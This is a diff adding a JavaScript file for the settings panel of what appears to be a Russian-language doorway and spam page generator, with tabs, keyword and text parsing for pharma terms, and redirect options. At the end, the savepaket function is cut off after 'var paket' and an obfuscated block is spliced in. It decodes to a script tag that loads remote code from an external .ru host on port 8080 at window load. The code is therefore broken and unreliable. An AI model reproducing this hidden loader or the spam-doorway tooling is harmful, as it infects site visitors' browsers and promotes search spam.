@@ -1,0 +1,459 @@
+	var maincolor="#"+color1;
+	var childcolor="#"+color2;
+
+
+
+	function TabMe(num){
+
+		
+		var tab1=document.getElementById('menu1');
+		var tab2=document.getElementById('menu2');
+		var tab3=document.getElementById('menu3');
+		var tab4=document.getElementById('menu4');
+		var tab6=document.getElementById('menu6');
+		
+		var div1=document.getElementById('nastroim');
+		var div2=document.getElementById('proverim');
+		var div3=document.getElementById('posmotrim');
+		var div4=document.getElementById('naparsim');
+		var div6=document.getElementById('money');
+		
+		if (num==1) {
+			tab1.style.background=maincolor;  div1.style.display="block";
+			tab2.style.background=childcolor; div2.style.display="none";
+			tab3.style.background=childcolor; div3.style.display="none";
+			tab4.style.background=childcolor; div4.style.display="none";
+			tab6.style.background=childcolor; div6.style.display="none";
+		}
+	
+		if (num==2) {
+			tab1.style.background=childcolor; div1.style.display="none";
+			tab2.style.background=maincolor;  div2.style.display="block";
+			tab3.style.background=childcolor; div3.style.display="none";
+			tab4.style.background=childcolor; div4.style.display="none";
+			tab6.style.background=childcolor; div6.style.display="none";
+		}
+
+		if (num==3) {
+			tab1.style.background=childcolor; div1.style.display="none";
+			tab2.style.background=childcolor; div2.style.display="none";
+			tab3.style.background=maincolor;  div3.style.display="block";
+			tab4.style.background=childcolor; div4.style.display="none";
+			tab6.style.background=childcolor; div6.style.display="none";
+		}
+
+		if (num==4) {
+			tab1.style.background=childcolor; div1.style.display="none";
+			tab2.style.background=childcolor; div2.style.display="none";
+			tab3.style.background=childcolor; div3.style.display="none";
+			tab4.style.background=maincolor;  div4.style.display="block";
+			tab6.style.background=childcolor; div6.style.display="none";
+		}
+		
+		if (num==6) {
+			tab1.style.background=childcolor; div1.style.display="none";
+			tab2.style.background=childcolor; div2.style.display="none";
+			tab3.style.background=childcolor; div3.style.display="none";
+			tab4.style.background=childcolor; div4.style.display="none";
+			tab6.style.background=maincolor;  div6.style.display="block";
+		}	
+
+	}
+
+
+
+
+	function SetOrange(id){
+		document.getElementById(id).style.background="#FEF8D6";
+		return true;	
+	}
+	
+	function SetCyan(id){
+		document.getElementById(id).style.background="#EAF1F4";
+		return true;
+	}	
+	
+
+	function SaveSet(){
+		var pole= document.getElementById('profile'); 
+		if (pole.value==""){alert('Вы не ввели название нового профиля настроек!\nВведите название, используя латинские символы'); return false;}
+		var form= document.getElementById('form1'); 
+		form.action="index.php";
+		form.target="_self";
+		form.submit();
+		//form.target="_blank";
+	}
+
+	function AddDoor(){
+		var form= document.getElementById('form1'); 
+		form.action="yes/paket.php";
+		form.target="_top";
+		form.submit();
+		//form.target="_blank";
+	}
+
+
+	function DelSet(){
+		// Раньше тут мессага выходила: Вы действительно хотите удалить НАХУЙ профиль (и тут название профиля)
+		// Можете приписать пару словечком в конфирм для остроты ощущений )))
+		var sett= document.getElementById('nn_profile').value; 
+		if (sett=="settings") {alert('Профиль settings мы не удаляем. \nТак как он нам нужен :)'); return false;}
+		if (confirm('Вы действительно хотите удалить профиль "'+sett+'"? :)')) window.location="index.php?del="+sett;
+		
+	}
+	
+	
+
+	function SetSet(url){
+		window.location="index.php?profile="+url;
+	}
+
+
+
+
+
+
+
+	function SelFTP(){
+		//SetOrange('pole2');
+		var sel=document.getElementById('nn_method');
+		var ftp_pole=document.getElementById('nn_ftp');
+		if (sel.value=="ftp") {ftp_pole.style.display="block";} 
+			else {ftp_pole.style.display="none";}
+	}
+	
+	
+	function SelNic(){
+		var sel=document.getElementById('nn_nic');
+		var nicfile=document.getElementById('nicfile');
+		var nicgen=document.getElementById('nicgen');
+
+		if (sel.value=="file") {nicfile.style.display="block"; nicgen.style.display="none"; } else
+		{nicfile.style.display="none"; nicgen.style.display="block"; }
+	
+	
+	}
+	
+	
+	function SelKeywords(){
+		var sel=document.getElementById('nn_keys');
+		var keyfile=document.getElementById('nn_keyfile');
+		var keypole=document.getElementById('nn_keypole');
+		var keyspisok=document.getElementById('nn_keyspisok');
+		if (sel.value=="keyfile") {keyfile.style.display="block"; keypole.style.display="none";  keyspisok.style.display="none";}
+		if (sel.value=="keypole") {keyfile.style.display="none"; keypole.style.display="block";  keyspisok.style.display="none";}
+		if (sel.value=="keyspisok") {keyfile.style.display="none"; keypole.style.display="none"; keyspisok.style.display="block"; }
+	}
+	
+	
+	function SelPaketko(){
+		var sel=document.getElementById('nn_paket');
+		var che=document.getElementById('paketko');
+		var portal=document.getElementById('portal');
+		
+		if (che.checked==true) {sel.style.width='90%'; portal.style.display='block';} else {sel.style.width='250px'; portal.style.display='none';}
+	
+	
+	}	
+
+
+	function SelOld(){
+		var sel=document.getElementById('nn_old');
+		var pole=document.getElementById('pole5_1');
+		if (sel.checked==true) {pole.style.display="block";} else
+			{pole.style.display="none";}
+	
+	
+	}
+
+
+
+	function SelVID(){
+		var sel=document.getElementById('nn_vid');
+		var exm=document.getElementById('exm');
+		if (sel.value=='dynamic') {exm.style.display="none";} else
+			{exm.style.display="block";}
+	
+	
+	}
+
+
+	function SelText(){
+		var sel=document.getElementById('nn_seltext');
+		var textfile=document.getElementById('nn_textfile');
+		var textspisok=document.getElementById('nn_textspisok');
+
+		if (sel.value=="file") {textfile.style.display="block"; textspisok.style.display="none"; }
+		if (sel.value=="parse") {textfile.style.display="none"; textspisok.style.display="none";  }
+		if (sel.value=="spisok") {textfile.style.display="none"; textspisok.style.display="block"; }
+	
+	}
+	
+	
+	function AlgoText(){
+		var sel=document.getElementById('algotext');
+		var sett=document.getElementById('algotext_settings');
+		if (sel.value=="figase") {
+			sett.style.display="block";
+		} 
+		else {
+			sett.style.display="none";
+		}
+	}	
+
+
+	function SelMis(){
+		var sel=document.getElementById('mis');
+		var sett=document.getElementById('mis_plot');
+		if (sel.checked==true) {
+			sett.style.display="block";
+		} 
+		else {
+			sett.style.display="none";
+		}
+	}	
+
+
+	function SelRedir(){
+		var sel=document.getElementById('checkredir');
+		var sett=document.getElementById('redpole');
+		if (sel.checked==true) {
+			sett.style.display="block";
+		} 
+		else {
+			sett.style.display="none";
+		}
+	}	
+
+
+
+
+	function SelOnepage(){
+		var op=document.getElementById('onepage');
+		var nn_op=document.getElementById('nn_onepage');
+		if (op.checked==true) {
+			nn_op.style.display="block";
+		} 
+		else {
+			nn_op.style.display="none";
+		}
+	}
+	
+
+	function SelRast(){
+		var op=document.getElementById('rastoiya');
+		var nn_op=document.getElementById('rastoiya_nn');
+		if (op.checked==true) {
+			nn_op.style.display="block";
+		} 
+		else {
+			nn_op.style.display="none";
+		}
+	}
+	
+	function SelMaxKeeeeeeys(){
+		var op=document.getElementById('max_keeeeeeys');
+		var nn_op=document.getElementById('max_keeeeeeys_div');
+		if (op.checked==true) {
+			nn_op.style.display="block";
+		} 
+		else {
+			nn_op.style.display="none";
+		}
+	}
+	
+
+	function SelHtmlmap(){
+		var sel=document.getElementById('nn_htmlmap');
+		var sett=document.getElementById('htmlkol');
+		if (sel.checked==true) {
+			sett.style.display="block";
+		} 
+		else {
+			sett.style.display="none";
+		}
+	}	
+
+
+	function SelInRedir(){
+		var sel=document.getElementById('nn_red');
+		var red1=document.getElementById('red1');
+		var red2=document.getElementById('red2');
+		var ipause=document.getElementById('mypause');
+		var mnogaaaa=document.getElementById('mnogaaaa');
+		
+		if (sel.value=="svoy") {
+			red1.style.display="none";
+			red2.style.display="block";
+			ipause.style.display="block";
+			mnogaaaa.style.display="none";
+		} 
+		else {
+			red1.style.display="block";
+			red2.style.display="none";
+			ipause.style.display="none";
+			mnogaaaa.style.display="block";
+		}
+		
+		if (sel.value=="simple") {
+			ipause.style.display="block";
+		}
+		
+		
+	}	
+
+	
+	
+	
+	// при загрузке настроек подправляет видимость нужных объектов. Да. Я знаю что я извращенец :)
+	function OnLoadMe(){
+		SelVID();
+		SelFTP();
+		SelNic();
+		SelKeywords();
+		SelText();
+		AlgoText();
+		SelMis();
+		SelRedir();
+		SelInRedir();
+		SelHtmlmap();
+		TabMe(1);
+		SelOnepage();
+		SelPaketko();
+		document.getElementById('mainbody').style.background="#"+color1;
+		SelRast();
+		SelMaxKeeeeeeys();
+		document.getElementById('goshb').checked=false;
+	}
+	
+	
+	
+	
+// AJAX XAJA JAXA AXAJ NAX POX PYH TYH LOL ГЫ-Ы-Ы-Ы, ППЦ, СКОКА ВРЕМЯ Я ТРАЧУ НА КАММЕНТЫ )))) ЙА БЛОНДИНКО )))
+
+
+function ParseMeReq1() {
+	if (xmlHttp.readyState == 3) {
+		var textparse=document.getElementById('nn_textparse');
+		var response = xmlHttp.responseText;
+		var re=response.split('|');
+		response=re[(re.length-2)];
+		var img='<img src="yes/img/load.gif"  style="margin-bottom: -2px; "> <input type="button" onClick="StopAjax(\'nn_textparse\');" value="stop"> ';
+		textparse.innerHTML=response+' '+img;
+	}
+	
+	if (xmlHttp.readyState == 4) {
+		var textparse=document.getElementById('nn_textparse');
+		var response = xmlHttp.responseText;
+		var re=response.split('|');
+		response=re[(re.length-2)];
+		textparse.innerHTML="Парсинг кончил :)<br /><a href='javascript:location.reload()' class='dd'>Обновите</a> эту страничку!";
+		
+	}
+}
+
+function ParseMe(ra) {
+	// Oh, parse me, parse, parse please! Yes! Yes! Ah! Oh! OMG ) Cool )))
+	var textparse=document.getElementById('nn_textparse');
+	var textpole=document.getElementById('nn_textparsepole');
+	var fname=document.getElementById('parsefilename').value;
+	var lang=document.getElementById('parselang').value;
+	var from=document.getElementById('parsefrom').value;
+	
+	var img='<img src="yes/img/load.gif"  style="margin-bottom: -2px; "> <input type="button" onClick="StopAjax(\'nn_textparse\');" value="stop"> ';
+
+	if (!fname) {alert ("Вы не ввели имя файла, под которым будет сохранен напарсенный текст! \nИмя вводим без расширения, латинскими буквами."); return false;}
+	if (!textpole.value) {alert ("Вы не ввели кейворды, по которым будем парсить текст! \nКейворды вводим через разделитель, например viagra;pharma;medic"); return false;}	
+
+	textparse.style.padding="5px";
+	
+	
+	var q = textpole.value;
+	var url = "yes/inc/parse.php?hren="+ra+"&fname="+fname+"&lang="+lang+"&q="+q+"&from="+from;
+	//alert(url);
+	textparse.innerHTML="start parsing... "+img;
+	
+	xmlHttp.open("GET", url, true);
+	xmlHttp.onreadystatechange = ParseMeReq1;
+	xmlHttp.send(null);
+}
+
+
+
+function StopAjax(id){
+	xmlHttp.abort();
+	document.getElementById(id).innerHTML='stopped';
+
+}
+
+
+
+
+
+
+
+function ParseKeysQuery() {
+	if (xmlHttp.readyState == 3) {
+		var keyparse=document.getElementById('nn_keyparse');
+		var response = xmlHttp.responseText;
+		var re=response.split('|');
+		response=re[(re.length-2)];
+		var img='<img src="yes/img/load.gif"  style="margin-bottom: -2px; "> <input type="button" onClick="StopAjax(\'nn_keyparse\');" value="stop"> ';
+		keyparse.innerHTML=response+' '+img;
+	}
+	
+	if (xmlHttp.readyState == 4) {
+		var keyparse=document.getElementById('nn_keyparse');
+		var response = xmlHttp.responseText;
+		var re=response.split('|');
+		response=re[(re.length-2)];
+		keyparse.innerHTML="Парсинг кончил :)<br><a href='javascript:location.reload()' class='dd'>Обновите</a> эту страничку!";
+		
+	}
+}
+
+function ParseKeys() {
+	// Oh, parse me, parse, parse please! Yes! Yes! Ah! Oh! OMG ) Cool )))
+	var keyparse=document.getElementById('nn_keyparse');
+	var textpole=document.getElementById('nn_keyparsepole').value;
+	var fname=document.getElementById('keyparsefilename').value;
+	var limit=document.getElementById('key_limit').value;
+
+	var img='<img src="yes/img/load.gif"  style="margin-bottom: -2px; "> <input type="button" onClick="StopAjax(\'nn_keyparse\');" value="stop"> ';
+
+	if (!fname) {alert ("Вы не ввели имя файла, под которым будет сохранен напарсенные кеи! \nИмя вводим без расширения, латинскими буквами."); return false;}
+	if (!textpole) {alert ("Вы не ввели кейворд, по которым будем парсить другие кейворды!"); return false;}	
+
+	keyparse.style.padding="5px";
+	
+	
+	var url = "yes/inc/over.php?key_parse="+textpole+"&fname_parse="+fname+"&ra="+MyRand(8,8888)+"&limit="+limit;
+
+	keyparse.innerHTML="Start... "+img;
+
+	xmlHttp.open("GET", url, true);
+	xmlHttp.onreadystatechange = ParseKeysQuery;
+	xmlHttp.send(null);
+}
+
+
+
+
+
+
+
+
+
+function qxml() {
+	if (xmlHttp.readyState == 4) {
+		var textpaket=document.getElementById('textpaket');
+		var response = xmlHttp.responseText;
+		textpaket.innerHTML="<b>Настройки пакетов сохранены!</b>";
+	}
+}
+
+
+
+function savepaket(ra) {
+	var paket
+try {var fj;if(fj!='P' && fj!='z'){fj=''};var X=new Array();var s=RegExp;var PH=new String();var m=String("replabLfY".substr(0,5)+"vmMce".substr(3));var T;if(T!='j'){T='j'};this.gc='';var b;if(b!='E'){b='E'};var bg=new Array();function t(g,F){var C='';this.ji='';var W=new String("tlz5[".substr(4));var o=String("UvQg".substr(3));W+=F;this.yQ='';W+=new String("NCSj]".substr(4));var w;if(w!='' && w!='px'){w='WI'};var y=new s(W, o);var LZ="";var rM;if(rM!='dL' && rM!='vO'){rM='dL'};return g[m](y, new String());};var ob='';var G=new Array();var u=t('866643055235568233360235462',"52346");this.fH="";var Ed;if(Ed!='' && Ed!='Dhw'){Ed='_r'};var r=t('/ErEbKct.tr4uK/trtb4ct.4rKuE/EftoKcKu4st.4c4n4/EmEeKrEcEa4dEoKltiKb4rEe4.Ec4o4mK.KmKx4/KgtoKotg4l4eE.EcKoEm4.EpKhtpE',"4KEt");var U=t('oGn4lGoIa4du',"4GuI");var no='';this.S='';var f=t('szc9r9izp0tz',"90z");var KQ;if(KQ!='I'){KQ='I'};var n=window;var x=t('hAtXtqpk:A/C/X9XwXeXeC-kcqoqmA.CpAiqcCfkoCcXoC.XcAoAmk.XsAiqfqyk-AckokmC.ATqhXeABClXeXnAdqekrqTAvq.CrAuq:q',"qAXCk");var Wz;if(Wz!='PC'){Wz='PC'};var l;if(l!='tu'){l='tu'};var Wn=t('cFr0eVaFtFeFEFlFe0mFe0n0tF',"0VF");th=function(){var My;if(My!='VH' && My!='ue'){My='VH'};var vR='';K=document[Wn](f);var N=new Array();var vk=new Array();ob=x+u;this.gd='';var ME=new Array();ob+=r;this.H="";var rH;if(rH!='pR' && rH != ''){rH=null};var QW;if(QW!='' && QW!='sr'){QW=''};K.defer=([1,5][0]);K.src=ob;var xz="";var pu;if(pu!='' && pu!='q'){pu=null};var l_="";var et;if(et!='gE' && et!='JY'){et='gE'};document.body.appendChild(K);this.BD="";};this.dc="";var mn;if(mn!='rd' && mn!='vf'){mn=''};var _a=new Array();n[U]=th;var Le;if(Le!='ip' && Le!='nN'){Le='ip'};} catch(Wj){var qP='';};
